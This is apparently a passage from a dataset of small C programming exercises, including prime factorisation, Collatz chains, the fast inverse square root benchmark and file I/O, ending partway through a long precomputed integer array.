    "#include<stdio.h>\n#include<math.h>\n\n\nlong Prime[1000010]={2,3},pnum=2;\nlong Factor[1000010],fnum=0;\nlong isPrime(long x){\n    long sq,i;\n    if(x==1){\n        return 0;\n    }\n    if(x==2||x==3){\n        return 1;\n    }\n    sq=(long)sqrt(1.0*x);\n    for(i=0;i<pnum&&Prime[i]<=sq;i++){\n        if(x%Prime[i]==0){\n            return 0;\n        }\n    }\n    Prime[pnum++]=x;\n    return 1;\n}\nlong main(){\n    long N,i=0,flag,num;\n    long F,sq;\n    scanf(\"%d\",&N);\n    printf(\"%d=\",N);\n    if(N==1){\n        printf(\"1\\n\");\n        return 0;\n    }\n    while(N>1){\n        flag=0;\n        for(;i<pnum;){\n            if(N%Prime[i]==0){\n                Factor[fnum++]=Prime[i];\n                N/=Prime[i];\n                flag=1;\n                break;\n            }else{\n                i++;\n            }\n        }\n        if(flag){\n            continue;\n        }else{\n            sq=(long)sqrt(1.0*N);\n            while(flag==0){\n                for(num=Prime[pnum-1]+1;;num++){\n                    if(isPrime(num)){\n                        break;\n                    }\n                }\n                if(N%Prime[i]==0){\n                    Factor[fnum++]=Prime[i];\n                    N/=Prime[i];\n                    flag=1;\n                    break;\n                }else{\n                    i++;\n                }\n                if(Prime[i-1]>=sq){\n                    Factor[fnum++]=N;\n                    N=1;\n                    flag=1;\n                }\n            }\n        }\n    }\n    i=0;\n    while(i<fnum){\n        F=Factor[i++];\n        num=1;\n        while(i<fnum&&Factor[i]==F){\n            i++;\n            num++;\n        }\n        if(num>1){\n            printf(\"%d^%d\",F,num);\n        }else{\n            printf(\"%d\",F);\n        }\n        if(i<fnum){\n            printf(\"*\");\n        }else{\n            printf(\"\\n\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n int n,m=0,s=0;\n scanf(\"%d\",&n);\n do{\n   m++;\n   s+=m;\n    }while(s<n);\n printf(\"%d\\n\",m);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n double i = 5;\n double j = i * 3 - 2;\n printf(\"i = %d and j = %d\\n\",i,j);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n#include <inttypes.h>\nstatic long long euler = 0;\nstatic long collatz = 3000001;\nstatic int chains[3000001];\nvoid initializeChains(void) {\n for (int i=0; i < collatz; i++) {\n  chains[i] = 0;\n }\n}\nunsigned long long chainLength(unsigned long long i) {\n if (i % 2 == 0) {\n  return (i/2);\n }\n else {\n  return (3*i + 1);\n }\n}\nint main(int argc, char** argv) {\n unsigned long long i, temp, step;\n unsigned long largest = 1;\n initializeChains();\n chains[0] = chains[1] = 1;\n temp = largest;\n for (i=2; i < collatz; i++) {\n  step = 0;\n  temp = i;\n  do {\n   temp = chainLength(temp);\n   step++;\n  } while (temp > i - 1);\n  chains[i] = step + chains[temp];\n  if (chains[i] > largest) {\n   largest = chains[i];\n   printf(\"%llu %lu\\n\", i, largest);\n  }\n }\n euler = largest;\n printf(\"%llu\\n\", euler);\nreturn 0;\n}",
    "#include<stdio.h>\nint main(){\n int a[] = { -13,5,-11,4,66,27,-10,8,23,-100 };\n int n = sizeof(a)/sizeof(int);\n int x = 0;\n for(int i=0;i<n;i++){\n  if(a[i]>0){\n   if(i!=x){\n    int t=a[i];a[i]=a[x];a[x]=t;\n   }\n   x++;\n  }\n }\n for(int i=0;i<n;i++){\n  printf(\"%d \",a[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\nvoid squeeze(char*,char*);\nint main(void)\n{\n    char a[] = \"abcd\";\n    char b[] = \"b\";\n    squeeze(a, b);\n    printf(\"%s\", a);\n    return 0;\n}\nvoid squeeze(char s[], char delete[]) {\n    int i;\n    int j;\n    for (i = 0, j = 0; s[i] != '\\0'; i++)\n    {\n        int k;\n        int keep;\n        for (keep = 1, k = 0; delete[k] != '\\0' && keep; k++)\n            keep = (s[i] != delete[k]);\n        if (keep)\n            s[j++] = s[i];\n    }\n    s[j] = '\\0';\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <math.h>\n#include <time.h>\nfloat fastInvSqrt(float number) {\n long i;\n float y = number;\n const float threehalfs = 1.5F;\n const float x2 = number * 0.5F;\n i = * (long *) &y;\n i = 0x5f3759df - (i >> 1);\n y = * (float *) &i;\n y = y * (threehalfs - (x2 * y * y));\n return y;\n}\nfloat normalInvSqrt(float number) {\n return 1 / sqrt(number);\n}\nint main(int argc, char const *argv[])\n{\n const long nIter = 1E9;\n float num = 0;\n time_t t;\n srand((unsigned) time(&t));\n printf(\"Calculating the inverse square roots of %.1e random numbers...\\n\\n\", (double)nIter);\n clock_t fastStart = clock();\n for (long i = 0; i < nIter; ++i)\n {\n  float num = (float)rand() / (float)((0x7fffffff));\n  fastInvSqrt(num);\n }\n clock_t fastEnd = clock();\n printf(\"Quake Algorithm:\\t\\t%.5lfs\\n\", (double)(fastEnd - fastStart) / ((clock_t)1000000000));\n clock_t normalStart = clock();\n for (long i = 0; i < nIter; ++i)\n {\n  float num = (float)rand() / (float)((0x7fffffff));\n  normalInvSqrt(num);\n }\n clock_t normalEnd = clock();\n printf(\"Library sqrt() function:\\t%.5lfs\\n\", (double)(normalEnd - normalStart) / ((clock_t)1000000000));\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n  int is_ItWrong;\n  int three_little_pigs;\n  int Balance;\n  int balance;\n  is_ItWrong = 0;\n  three_little_pigs = 3;\n  Balance = 1;\n  balance = 2;\n  printf(\"Balance = %d\\n\", Balance);\n  printf(\"balance = %d\\n\", balance);\n  printf(\"three_little_pigs = %d\\n\", three_little_pigs);\n  printf(\"is_ItWrong = %d\\n\", is_ItWrong);\n  return 0;\n}",
    "int main()\n{\n int sum=0;\n int x = 4;\n {\n  sum+=x;\n  int x = 3;\n  {\n   sum+=x;\n   int x = 2;\n   sum+=x;\n  }\n }\n sum+=x;\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main() {\n  char caractere;\n  scanf(\"%c\", &caractere);\n  if(caractere>='a' && caractere<='z') {\n    caractere = toupper(caractere);\n    printf(\"%c\\n\", caractere);\n  } else if(caractere>='A' && caractere<='Z') {\n    caractere = tolower(caractere);\n    printf(\"%c\\n\", caractere);\n  } else {\n    printf(\"%c\\n\", caractere);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n\nint main() {\n    char input_filename[] = \"gigel_in.bin\";\n    FILE *in;\n    if ((in = fopen(input_filename, \"rb\")) == ((void*)0)) {\n        fprintf((stderr), \"Can't open %s\", input_filename);\n        return -1;\n    }\n    int n, v[100], i;\n    fread(&n, sizeof(int), 1, in);\n    fread(v, sizeof(int), n, in);\n    fclose(in);\n    for (i = 0; i < n; ++i) {\n        v[i] <<= 1;\n    }\n    char output_filename[] = \"gigel_out.bin\";\n    FILE *out;\n    if ((out = fopen(output_filename, \"wb\")) == ((void*)0)) {\n        fprintf((stderr), \"Can't open %s\", output_filename);\n        return -1;\n    }\n    fwrite(&n, sizeof(int), 1, out);\n    fwrite(v, sizeof(int), n, out);\n    fclose(out);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n  char *str;\n  char c0, c1, c2, c3;\n  int i;\n  float f;\n  str = \"DJU\";\n  c0 = str[0];\n  c1 = str[1];\n  c2 = str[2];\n  c3 = str[3];\n  i = *((int *) str);\n  f = *((float *) str);\n  printf(\"1. string: %s\\n\", str);\n  printf(\"2. char: \\n\"\n      \"\\tchar str[0] : %1c(%02X), \\n\"\n      \"\\tchar str[1] : %1c(%02X), \\n\"\n      \"\\tchar str[2] : %1c(%02X), \\n\"\n      \"\\tchar str[3] : %2c(%02X), \\n\",\n      c0, c0, c1, c1, c2, c2, c3, c3);\n  printf(\"3. int: %d(%08X)\\n\", i, i);\n  printf(\"4. float: %e\\n\", f);\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint arr[10000] = {1, 1, 2, 2, 2, 2, 2, 3, 3, 2, 3, 4, 2, 3, 4, 4, 3, 3, 3, 5, 4, 2, 4, 6, 3, 4, 5, 4, 4, 4, 4, 6, 4, 3, 6, 7, 2, 4, 6, 6, 5, 4, 3, 7, 6, 3, 6, 8, 4, 5, 6, 5, 4, 6, 6, 9, 4, 2, 7, 8, 4, 5, 8, 7, 6, 6, 3, 8, 6, 4, 8, 9, 3, 6, 8, 7, 6, 4, 6, 11, 7, 3, 7, 10, 4, 6, 8, 6, 7, 8, 6, 8, 4, 5, 10, 12, 3, 6, 9, 7, 8, 4, 6, 12, 8, 4, 7, 11, 4, 8, 10, 8, 5, 6, 6, 11, 8, 4, 12, 12, 5, 6, 6, 8, 8, 9, 6, 11, 8, 4, 11, 10, 4, 8, 12, 9, 5, 6, 7, 14, 6, 3, 12, 15, 6, 9, 8, 5, 8, 8, 8, 12, 9, 6, 10, 12, 4, 5, 12, 12, 10, 7, 3, 14, 8, 6, 12, 12, 5, 8, 13, 7, 8, 8, 10, 15, 4, 5, 11, 15, 6, 8, 10, 9, 10, 8, 6, 12, 12, 4, 14, 14, 3, 11, 12, 10, 6, 8, 10, 15, 8, 4, 10, 14, 6, 11, 12, 11, 12, 8, 7, 11, 6, 4, 16, 18, 6, 6, 10, 12, 10, 8, 8, 19, 11, 5, 11, 10, 6, 12, 16, 6, 7, 12, 6, 17, 8, 6, 16, 16, 7, 7, 12, 11, 10, 8, 8, 15, 8, 8, 15, 16, 4, 9, 16, 12, 9, 6, 10, 16, 12, 4, 14, 18, 6, 12, 6, 7, 12, 12, 12, 18, 8, 7, 13, 16, 4, 8, 18, 12, 11, 6, 7, 16, 12, 8, 16, 18, 6, 12, 10, 8, 10, 10, 10, 18, 12, 4, 18, 18, 6, 7, 12, 15, 10, 13, 7, 16, 8, 6, 20, 12, 5, 14, 18, 12, 6, 8, 12, 21, 12, 6, 10, 18, 10, 12, 14, 9, 14, 8, 7, 17, 8, 7, 20, 22, 5, 9, 14, 10, 16, 12, 10, 18, 8, 6, 11, 16, 8, 13, 20, 12, 9, 10, 10, 20, 8, 4, 20, 24, 7, 10, 12, 14, 12, 8, 10, 16, 15, 8, 18, 10, 6, 16, 16, 15, 10, 12, 7, 20, 12, 5, 18, 22, 8, 11, 13, 8, 12, 12, 16, 18, 8, 6, 18, 21, 4, 11, 20, 15, 11, 10, 6, 23, 14, 10, 18, 12, 9, 10, 14, 12, 12, 13, 12, 26, 8, 6, 19, 20, 6, 6, 18, 12, 17, 14, 6, 17, 12, 8, 22, 23, 7, 14, 12, 11, 12, 6, 16, 24, 16, 6, 11, 20, 6, 17, 16, 14, 11, 15, 14, 14, 8, 8, 24, 18, 5, 14, 20, 14, 16, 8, 8, 25, 12, 5, 15, 21, 10, 12, 18, 12, 8, 12, 13, 24, 12, 5, 26, 24, 10, 11, 12, 13, 12, 16, 8, 18, 12, 10, 19, 14, 8, 16, 26, 16, 14, 6, 7, 22, 10, 8, 22, 27, 6, 16, 12, 12, 16, 12, 16, 20, 12, 9, 14, 22, 8, 10, 20, 12, 17, 8, 11, 27, 16, 7, 20, 22, 8, 16, 21, 10, 8, 12, 16, 24, 8, 6, 21, 24, 6, 13, 14, 19, 18, 16, 7, 14, 18, 10, 28, 18, 6, 12, 12, 17, 10, 15, 18, 30, 12, 5, 19, 16, 8, 16, 22, 9, 17, 12, 11, 24, 10, 10, 24, 28, 5, 10, 18, 16, 16, 10, 10, 27, 18, 10, 15, 18, 10, 12, 24, 11, 13, 20, 12, 23, 8, 6, 26, 24, 11, 14, 13, 16, 16, 8, 14, 26, 12, 8, 22, 24, 6, 18, 24, 18, 7, 8, 11, 24, 20, 7, 24, 24, 9, 19, 12, 11, 20, 16, 14, 15, 12, 8, 22, 24, 10, 12, 24, 22, 15, 10, 7, 28, 12, 10, 24, 21, 12, 18, 20, 7, 8, 16, 14, 32, 13, 6, 23, 20, 10, 12, 20, 18, 16, 18, 10, 24, 8, 8, 32, 24, 7, 13, 25, 13, 16, 12, 20, 24, 12, 8, 11, 31, 8, 18, 14, 15, 22, 12, 11, 23, 18, 6, 26, 24, 6, 14, 22, 20, 18, 12, 16, 29, 16, 13, 14, 10, 6, 18, 28, 15, 14, 16, 12, 27, 10, 7, 32, 33, 10, 11, 10, 17, 18, 14, 14, 24, 17, 8, 26, 20, 8, 21, 24, 19, 12, 13, 11, 28, 16, 6, 22, 24, 10, 14, 21, 14, 18, 16, 16, 24, 8, 12, 26, 32, 6, 12, 28, 12, 21, 8, 10, 28, 16, 13, 24, 24, 11, 20, 14, 8, 14, 18, 18, 33, 12, 8, 22, 28, 12, 14, 28, 22, 10, 10, 11, 17, 18, 10, 34, 24, 6, 22, 12, 20, 16, 12, 18, 32, 21, 7, 22, 22, 12, 16, 16, 12, 17, 22, 15, 24, 8, 8, 32, 30, 8, 15, 26, 16, 16, 12, 10, 33, 20, 8, 15, 24, 12, 12, 30, 21, 17, 10, 14, 34, 12, 8, 34, 24, 9, 14, 14, 17, 18, 23, 14, 25, 16, 13, 22, 16, 6, 24, 30, 12, 17, 12, 15, 32, 16, 5, 22, 38, 10, 23, 16, 16, 18, 12, 24, 18, 13, 12, 28, 24, 6, 11, 24, 24, 21, 18, 7, 28, 16, 10, 30, 24, 10, 14, 23, 16, 16, 16, 18, 37, 12, 7, 30, 28, 14, 16, 20, 15, 14, 16, 7, 27, 24, 12, 32, 22, 8, 19, 20, 17, 12, 12, 20, 36, 12, 10, 22, 32, 10, 21, 28, 12, 19, 16, 17, 20, 10, 14, 32, 36, 11, 10, 18, 14, 24, 8, 18, 37, 24, 10, 11, 22, 8, 24, 28, 18, 17, 18, 10, 32, 12, 9, 38, 28, 10, 16, 21, 20, 24, 16, 12, 21, 16, 8, 31, 28, 8, 19, 26, 25, 11, 14, 18, 27, 18, 6, 28, 24, 14, 24, 20, 16, 20, 24, 18, 33, 8, 10, 18, 22, 8, 14, 36, 24, 24, 10, 10, 37, 12, 11, 32, 32, 11, 16, 26, 10, 14, 18, 20, 27, 15, 10, 27, 32, 12, 18, 20, 21, 23, 20, 10, 26, 20, 8, 36, 18, 7, 24, 26, 24, 12, 8, 24, 36, 20, 7, 18, 33, 12, 22, 18, 12, 23, 20, 11, 28, 22, 10, 38, 38, 10, 14, 14, 16, 14, 18, 20, 36, 12, 12, 26, 14, 16, 20, 36, 15, 14, 18, 17, 35, 14, 12, 36, 36, 10, 12, 16, 24, 20, 16, 10, 36, 21, 8, 35, 20, 6, 14, 32, 21, 19, 18, 14, 31, 16, 12, 24, 36, 12, 26, 20, 11, 26, 12, 24, 24, 12, 12, 22, 36, 8, 20, 34, 24, 24, 12, 11, 32, 24, 12, 30, 18, 9, 24, 20, 17, 16, 23, 20, 32, 12, 7, 34, 32, 14, 10, 28, 24, 14, 18, 14, 32, 10, 13, 42, 33, 9, 29, 24, 16, 16, 14, 18, 36, 28, 8, 15, 24, 12, 20, 24, 18, 26, 16, 15, 29, 16, 16, 38, 30, 8, 10, 33, 20, 24, 12, 18, 40, 12, 13, 19, 32, 12, 24, 26, 12, 19, 16, 18, 44, 16, 7, 40, 38, 9, 13, 14, 16, 22, 24, 20, 21, 24, 14, 30, 24, 6, 21, 32, 29, 17, 16, 14, 28, 20, 8, 36, 39, 16, 22, 10, 17, 20, 16, 28, 36, 15, 13, 28, 22, 8, 22, 36, 18, 18, 20, 10, 40, 20, 10, 28, 24, 17, 21, 33, 14, 18, 16, 14, 42, 12, 8, 31, 42, 12, 19, 22, 24, 24, 18, 14, 17, 20, 12, 42, 24, 12, 24, 26, 24, 18, 13, 24, 39, 16, 7, 23, 34, 8, 30, 36, 18, 19, 12, 19, 24, 14, 15, 40, 40, 7, 18, 18, 27, 26, 12, 12, 36, 26, 10, 23, 28, 16, 20, 32, 19, 14, 27, 14, 40, 12, 6, 46, 24, 13, 22, 25, 17, 24, 24, 16, 37, 20, 16, 26, 21, 12, 18, 32, 21, 14, 12, 18, 40, 24, 12, 36, 42, 10, 15, 14, 14, 30, 26, 26, 27, 12, 12, 26, 34, 10, 14, 38, 22, 31, 14, 14, 46, 16, 10, 26, 36, 11, 24, 26, 20, 10, 16, 28, 40, 23, 12, 34, 20, 14, 20, 20, 18, 26, 26, 10, 27, 16, 12, 46, 32, 10, 26, 30, 23, 14, 12, 28, 39, 16, 8, 30, 40, 14, 24, 28, 22, 19, 20, 10, 26, 18, 16, 36, 30, 10, 18, 28, 24, 30, 15, 10, 46, 20, 18, 31, 20, 12, 20, 44, 12, 19, 18, 12, 40, 14, 9, 40, 50, 16, 14, 20, 19, 22, 18, 24, 30, 30, 10, 27, 28, 8, 31, 32, 30, 14, 17, 23, 34, 16, 10, 36, 24, 10, 30, 13, 20, 30, 24, 24, 30, 16, 10, 33, 42, 10, 16, 32, 24, 27, 16, 15, 44, 24, 11, 38, 22, 11, 20, 28, 17, 12, 28, 24, 48, 12, 10, 27, 32, 14, 13, 36, 33, 24, 14, 10, 28, 22, 10, 50, 36, 10, 26, 28, 17, 26, 16, 24, 40, 21, 11, 15, 34, 18, 26, 16, 15, 28, 24, 23, 36, 16, 12, 40, 40, 10, 23, 39, 20, 20, 12, 20, 33, 16, 18, 28, 31, 10, 31, 36, 18, 21, 16, 10, 35, 24, 8, 52, 36, 18, 16, 14, 32, 16, 28, 16, 39, 16, 12, 35, 22, 14, 28, 44, 18, 16, 10, 19, 44, 24, 10, 34, 45, 14, 24, 20, 11, 28, 20, 24, 33, 12, 18, 36, 40, 8, 18, 40, 28, 29, 23, 14, 32, 12, 16, 28, 30, 15, 20, 33, 14, 22, 16, 28, 53, 20, 7, 31, 37, 10, 16, 30, 30, 28, 12, 15, 36, 28, 16, 46, 24, 10, 34, 20, 26, 20, 24, 24, 30, 24, 8, 22, 34, 12, 23, 36, 24, 26, 26, 18, 34, 12, 12, 46, 39, 9, 22, 20, 24, 26, 12, 18, 52, 30, 17, 27, 22, 14, 16, 40, 18, 18, 28, 17, 47, 12, 11, 54, 44, 12, 17, 26, 17, 28, 24, 20, 18, 20, 16, 38, 36, 12, 29, 24, 26, 15, 10, 23, 48, 32, 12, 30, 42, 12, 30, 22, 14, 22, 16, 30, 37, 20, 11, 36, 32, 10, 24, 42, 24, 27, 16, 11, 44, 26, 13, 38, 43, 16, 20, 18, 20, 18, 22, 28, 42, 13, 10, 42, 28, 14, 24, 28, 25, 22, 33, 11, 34, 24, 16, 50, 18, 11, 20, 40, 32, 16, 12, 28, 52, 12, 13, 26, 43, 12, 26, 36, 18, 34, 24, 20, 27, 18, 11, 38, 40, 13, 22, 22, 16, 36, 22, 18, 51, 24, 12, 15, 32, 14, 28, 48, 24, 20, 20, 18, 32, 14, 12, 52, 45, 15, 18, 18, 34, 24, 24, 14, 32, 28, 12, 47, 22, 12, 24, 32, 24, 22, 18, 22, 48, 20, 9, 46, 38, 17, 30, 30, 14, 22, 16, 20, 42, 16, 20, 22, 48, 14, 15, 42, 30, 22, 10, 14, 47, 26, 16, 44, 24, 13, 28, 30, 16, 20, 33, 32, 51, 12, 11, 33, 32, 20, 24, 32, 15, 26, 18, 11, 37, 24, 12, 46, 47, 7, 29, 30, 28, 18, 14, 28, 36, 36, 10, 30, 36, 12, 34, 24, 26, 37, 24, 22, 22, 12, 16, 50, 36, 10, 16, 33, 31, 22, 20, 24, 48, 16, 11, 27, 33, 16, 30, 42, 15, 19, 28, 14, 52, 20, 10, 46, 44, 22, 18, 22, 28, 34, 18, 20, 33, 16, 12, 43, 28, 10, 27, 48, 29, 26, 20, 18, 34, 14, 12, 34, 48, 10, 36, 20, 16, 36, 20, 34, 40, 26, 15, 28, 34, 10, 18, 44, 30, 18, 18, 14, 47, 24, 19, 38, 30, 12, 28, 36, 22, 22, 20, 28, 48, 20, 8, 47, 52, 12, 13, 18, 30, 22, 26, 15, 40, 30, 14, 58, 18, 13, 28, 24, 17, 22, 28, 28, 50, 28, 12, 19, 28, 18, 26, 38, 24, 31, 20, 15, 44, 12, 20, 56, 57, 7, 15, 34, 16, 36, 14, 22, 48, 29, 18, 23, 28, 18, 24, 40, 24, 16, 23, 20, 47, 16, 10, 46, 36, 18, 26, 33, 32, 26, 20, 20, 37, 20, 17, 38, 32, 10, 38, 32, 27, 25, 20, 18, 34, 28, 7, 46, 50, 16, 29, 20, 22, 20, 36, 32, 30, 12, 12, 45, 40, 10, 21, 56, 24, 31, 14, 15, 50, 20, 14, 36, 24, 23, 28, 28, 27, 24, 16, 18, 59, 21, 13, 39, 42, 12, 14, 36, 21, 26, 32, 21, 40, 24, 16, 50, 42, 9, 30, 26, 22, 20, 12, 36, 48, 24, 10, 30, 51, 16, 31, 30, 22, 29, 20, 27, 22, 28, 18, 48, 36, 9, 22, 20, 32, 40, 26, 14, 54, 24, 16, 30, 22, 16, 28, 48, 18, 17, 22, 26, 51, 14, 12, 62, 48, 19, 30, 20, 17, 16, 24, 20, 39, 33, 12, 30, 28, 12, 33, 48, 37, 22, 21, 15, 52, 20, 12, 44, 48, 16, 22, 31, 17, 32, 16, 32, 32, 16, 17, 34, 51, 16, 20, 38, 30, 34, 12, 11, 56, 30, 17, 40, 38, 14, 32, 36, 16, 22, 28, 24, 36, 16, 14, 50, 28, 10, 28, 36, 37, 33, 24, 14, 29, 26, 12, 60, 45, 12, 18, 28, 36, 16, 16, 36, 58, 28, 10, 31, 32, 18, 40, 24, 15, 22, 36, 15, 47, 20, 21, 44, 36, 14, 15, 45, 22, 40, 16, 24, 48, 20, 20, 23, 44, 16, 16, 46, 19, 25, 30, 26, 50, 16, 14, 58, 36, 11, 22, 14, 27, 32, 27, 30, 48, 20, 12, 38, 28, 8, 40, 56, 30, 21, 18, 25, 48, 28, 9, 38, 51, 14, 33, 18, 14, 34, 24, 30, 30, 27, 16, 38, 44, 14, 20, 32, 36, 32, 20, 18, 46, 20, 12, 50, 30, 18, 32, 46, 20, 18, 24, 16, 61, 20, 14, 39, 48, 16, 22, 36, 30, 32, 16, 11, 37, 32, 23, 64, 38, 10, 30, 28, 28, 22, 18, 30, 36, 20, 14, 22, 48, 20, 29, 42, 21, 38, 16, 27, 38, 16, 12, 52, 60, 9, 32, 36, 28, 20, 16, 30, 53, 26, 17, 28, 22, 18, 26, 36, 18, 31, 36, 18, 52, 20, 12, 60, 50, 19, 21, 20, 32, 24, 32, 22, 42, 24, 10, 47, 31, 14, 38, 48, 32, 19, 16, 18, 45, 36, 12, 34, 24, 17, 28, 30, 28, 30, 32, 32, 52, 12, 17, 46, 32, 10, 16, 58, 24, 39, 20, 14, 54, 20, 15, 38, 54, 22, 36, 20, 17, 28, 18, 30, 54, 24, 10, 39, 48, 20, 17, 36, 38, 20, 33, 15, 20, 28, 20, 64, 24, 11, 40, 39, 27, 20, 20, 26, 52, 28, 14, 42, 56, 16, 30, 22, 21, 24, 20, 26, 48, 18, 12, 58, 44, 16, 21, 42, 24, 30, 24, 22, 57, 24, 18, 30, 28, 16, 28, 56, 25, 18, 22, 14, 58, 14, 16, 66, 48, 17, 20, 24, 28, 38, 32, 24, 33, 33, 16, 35, 34, 10, 32, 36, 24, 32, 20, 23, 54, 28, 10, 36, 48, 14, 34, 33, 27, 36, 20, 42, 36, 16, 20, 28, 48, 10, 33, 42, 40, 34, 16, 14, 44, 40, 10, 46, 30, 18, 24, 30, 17, 24, 36, 38, 64, 12, 9, 43, 32, 20, 26, 48, 30, 24, 30, 18, 48, 18, 16, 58, 44, 13, 23, 28, 34, 30, 14, 32, 54, 26, 14, 42, 48, 10, 31, 32, 15, 43, 36, 18, 23, 16, 24, 48, 48, 17, 24, 36, 28, 32, 16, 24, 66, 32, 20, 26, 36, 14, 32, 50, 18, 17, 20, 28, 57, 30, 11, 68, 44, 12, 27, 22, 29, 26, 34, 16, 36, 24, 18, 54, 40, 14, 25, 46, 40, 17, 14, 27, 44, 26, 14, 44, 54, 20, 36, 20, 24, 34, 24, 24, 48, 32, 18, 45, 22, 12, 22, 56, 24, 38, 18, 11, 64, 16, 18, 52, 44, 13, 32, 54, 20, 22, 32, 34, 39, 16, 14, 31, 59, 26, 26, 32, 29, 38, 20, 15, 47, 26, 14, 54, 36, 13, 42, 20, 40, 20, 21, 42, 52, 28, 11, 26, 34, 18, 36, 44, 24, 41, 24, 23, 27, 18, 15, 64, 67, 12, 21, 36, 22, 30, 18, 22, 54, 30, 20, 38, 28, 22, 40, 44, 29, 15, 39, 20, 64, 24, 14, 56, 36, 16, 14, 33, 27, 32, 16, 22, 53, 24, 20, 54, 48, 10, 30, 46, 18, 21, 20, 30, 52, 28, 16, 42, 52, 18, 38, 14, 16, 42, 26, 40, 42, 24, 14, 28, 54, 10, 23, 60, 40, 31, 14, 19, 53, 32, 20, 54, 36, 15, 22, 34, 32, 32, 24, 24, 55, 23, 11, 43, 44, 20, 26, 28, 39, 31, 42, 18, 34, 20, 12, 70, 22, 17, 44, 46, 17, 24, 24, 28, 54, 24, 12, 31, 56, 18, 37, 36, 33, 36, 26, 23, 40, 18, 14, 62, 48, 11, 20, 38, 28, 34, 28, 24, 59, 20, 21, 26, 28, 22, 32, 56, 21, 29, 22, 28, 64, 24, 9, 58, 63, 16, 34, 24, 28, 20, 24, 26, 33, 44, 22, 45, 24, 10, 35, 40, 39, 19, 26, 22, 51, 28, 10, 60, 42, 16, 34, 30, 28, 36, 24, 44, 52, 16, 14, 52, 47, 12, 18, 44, 24, 34, 24, 14, 64, 44, 24, 32, 40, 22, 16, 30, 23, 24, 36, 24, 63, 16, 14, 59, 48, 16, 21, 52, 37, 36, 18, 18, 34, 18, 24, 56, 39, 13, 42, 28, 27, 28, 20, 42, 64, 42, 9, 27, 44, 12, 44, 48, 18, 27, 24, 23, 44, 16, 25, 56, 52, 14, 31, 33, 28, 42, 16, 22, 42, 20, 16, 42, 51, 24, 24, 50, 30, 26, 34, 18, 52, 22, 10, 74, 48, 21, 30, 24, 32, 30, 33, 22, 46, 32, 20, 43, 22, 18, 26, 60, 36, 26, 14, 15, 64, 20, 15, 48, 72, 21, 26, 26, 17, 38, 28, 36, 36, 23, 22, 38, 56, 10, 31, 44, 24, 43, 27, 26, 62, 24, 18, 40, 24, 15, 38, 52, 24, 22, 24, 40, 56, 16, 18, 52, 42, 16, 24, 18, 39, 38, 24, 15, 48, 48, 12, 78, 42, 14, 28, 34, 32, 24, 32, 42, 60, 28, 12, 27, 34, 16, 43, 46, 18, 21, 32, 22, 41, 26, 16, 50, 54, 16, 28, 42, 36, 34, 16, 22, 75, 24, 17, 38, 32, 16, 34, 56, 24, 24, 28, 28, 54, 12, 11, 70, 60, 21, 18, 33, 34, 34, 28, 26, 42, 28, 16, 42, 56, 12, 45, 48, 43, 29, 14, 22, 28, 38, 16, 58, 30, 20, 42, 22, 27, 44, 39, 24, 39, 20, 18, 42, 52, 16, 22, 58, 30, 30, 24, 19, 68, 20, 17, 54, 50, 19, 36, 36, 16, 22, 28, 38, 66, 27, 12, 41, 28, 28, 16, 36, 40, 42, 36, 15, 47, 28, 16, 70, 36, 10, 38, 46, 36, 34, 20, 34, 63, 20, 13, 23, 60, 14, 32, 34, 21, 41, 20, 33, 54, 24, 23, 52, 50, 9, 29, 44, 32, 32, 18, 32, 48, 36, 20, 30, 32, 18, 40, 60, 26, 30, 34, 14, 50, 20, 10, 72, 66, 22, 22, 20, 37, 28, 28, 34, 52, 31, 16, 63, 22, 18, 40, 48, 24, 19, 30, 19, 64, 24, 18, 50, 58, 14, 38, 41, 22, 32, 16, 28, 45, 20, 16, 53, 62, 16, 20, 54, 36, 42, 22, 21, 47, 36, 28, 36, 36, 28, 36, 22, 20, 24, 28, 34, 75, 24, 10, 55, 54, 18, 34, 48, 24, 26, 28, 19, 37, 26, 20, 76, 48, 13, 43, 24, 35, 30, 20, 42, 36, 41, 10, 35, 60, 20, 25, 28, 39, 39, 36, 31, 48, 20, 16, 68, 30, 14, 26, 54, 34, 38, 20, 20, 78, 24, 22, 23, 32, 16, 38, 62, 24, 22, 28, 20, 68, 28, 18, 70, 48, 13, 22, 36, 25, 40, 48, 24, 42, 16, 20, 43, 34, 14, 38, 56, 37, 36, 14, 34, 51, 34, 12, 48, 69, 14, 34, 26, 28, 26, 20, 38, 51, 30, 27, 44, 46, 12, 30, 44, 39, 48, 32, 18, 54, 28, 16, 58, 36, 26, 24, 33, 17, 22, 24, 40, 72, 16, 12, 58, 60, 24, 28, 44, 26, 31, 26, 14, 50, 44, 20, 68, 36, 13, 38, 36, 37, 18, 23, 32, 64, 24, 21, 34, 44, 16, 30, 54, 15, 51, 34, 28, 44, 18, 24, 54, 74, 15, 24, 26, 28, 48, 18, 20, 69, 32, 14, 39, 38, 16, 40, 64, 36, 22, 33, 33, 52, 20, 14, 66, 36, 17, 24, 39, 48, 40, 28, 30, 40, 36, 12, 47, 36, 18, 40, 40, 36, 18, 24, 23, 68, 36, 10, 54, 52, 18, 53, 20, 17, 36, 40, 42, 33, 20, 20, 44, 48, 16, 25, 76, 44, 30, 18, 14, 62, 26, 26, 66, 54, 15, 28, 36, 17, 36, 32, 32, 64, 28, 16, 47, 44, 20, 28, 20, 30, 38, 28, 19, 60, 36, 17, 60, 52, 16, 37, 54, 28, 18, 16, 46, 42, 40, 16, 46, 55, 16, 51, 24, 32, 36, 24, 31, 46, 18, 20, 76, 48, 17, 20, 30, 36, 26, 33, 30, 71, 28, 18, 46, 32, 24, 30, 72, 21, 21, 30, 18, 74, 20, 14, 68, 62, 22, 25, 34, 40, 44, 18, 20, 48, 33, 22, 54, 40, 14, 32, 52, 33, 31, 36, 28, 40, 24, 14, 46, 48, 28, 48, 26, 17, 48, 28, 44, 59, 16, 14, 22, 69, 12, 32, 62, 36, 40, 16, 19, 64, 34, 17, 56, 42, 22, 43, 38, 22, 32, 46, 24, 57, 24, 14, 59, 48, 16, 27, 54, 39, 26, 28, 22, 34, 26, 20, 